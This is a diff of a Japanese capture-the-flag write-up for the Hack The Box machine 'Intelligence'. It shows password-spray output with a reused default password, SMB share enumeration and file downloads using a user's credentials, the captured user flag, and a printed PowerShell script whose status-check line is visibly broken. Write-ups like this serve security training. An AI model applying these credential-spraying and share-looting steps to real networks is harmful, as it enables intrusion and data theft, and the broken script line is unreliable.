@@ -92,10 +92,7 @@ pdfファイルをダウンロード
 ```sh
 └─$ grep 'http' results.txt | awk -F ',' '{print $4}' | sort > urls.txt
 
-└─$ while read url 
-do
-    curl -s "$url" -o $(echo $url | awk -F '/' {'print $5'}) 
-done < urls.txt
+└─$ for url in (cat urls.txt); do curl -O -s "$url"; done
 
 └─$ ls
 2020-01-01-upload.pdf  2020-03-05-upload.pdf  2020-05-21-upload.pdf  2020-06-28-upload.pdf  2020-09-06-upload.pdf  2020-11-13-upload.pdf  2021-02-21-upload.pdf
@@ -244,13 +241,58 @@ SMB         10.129.95.154   445    DC               [-] intelligence.htb\Travis.
 SMB         10.129.95.154   445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
 SMB         10.129.95.154   445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
 ```
-step1で5985番オープンを確認したが、winrmログイン可能ユーザは存在しなかった
+usersフォルダが読み取り可能であったため、ユーザフラグゲット！
 ```sh
-└─$ netexec ldap 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --groups 'Remote Management Users'
-LDAP        10.129.95.154   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb)
-LDAP        10.129.95.154   389    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
-LDAP        10.129.95.154   389    DC               [-] Group Remote Management Users has no members
+└─$ netexec smb 10.129.95.154 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares                      
+SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
+SMB         10.129.95.154   445    DC               [*] Enumerated shares
+SMB         10.129.95.154   445    DC               Share           Permissions     Remark
+SMB         10.129.95.154   445    DC               -----           -----------     ------
+SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.95.154   445    DC               C$                              Default share
+SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.95.154   445    DC               IT              READ            
+SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
+SMB         10.129.95.154   445    DC               Users           READ            
+
+└─$ smbget -U 'intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876' smb://10.129.95.154/Users/tiffany.molina/desktop/user.txt
+Using domain: INTELLIGENCE.HTB, user: Tiffany.Molina
+smb://10.129.95.154/Users/tiffany.molina/desktop/user.txt                                                                                                              
+Downloaded 34b in 7 seconds
+
+└─$ cat user.txt                                 
+7e6cfe6d57ea9780f87086f2b6223d4c
 ```
 
 
 ## STEP 3
+step2でitフォルダも読み取り可能であることを確認  
+中にはpowershellスクリプトを確認
+```sh
+└─$ smbclient -U 'intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876' -c 'dir' //10.129.95.154/IT
+  .                                   D        0  Sun Apr 18 20:50:55 2021
+  ..                                  D        0  Sun Apr 18 20:50:55 2021
+  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021
+
+                3770367 blocks of size 4096. 1441638 blocks available
+
+└─$ smbget -U 'intelligence.htb/Tiffany.Molina%NewIntelligenceCorpUser9876' smb://10.129.95.154/IT/downdetector.ps1                  
+Using domain: INTELLIGENCE.HTB, user: Tiffany.Molina
+smb://10.129.95.154/IT/downdetector.ps1                                                                                                                                
+Downloaded 1.02kB in 7 seconds
+```
+```powershell
+└─$ cat downdetector.ps1 
+��# Check web server status. Scheduled to run every 5min
+Import-Module ActiveDirectory 
+foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
+try {
+$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
+if(.StatusCode -ne 200) {
+Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
+}
+} catch {}
+}
+```
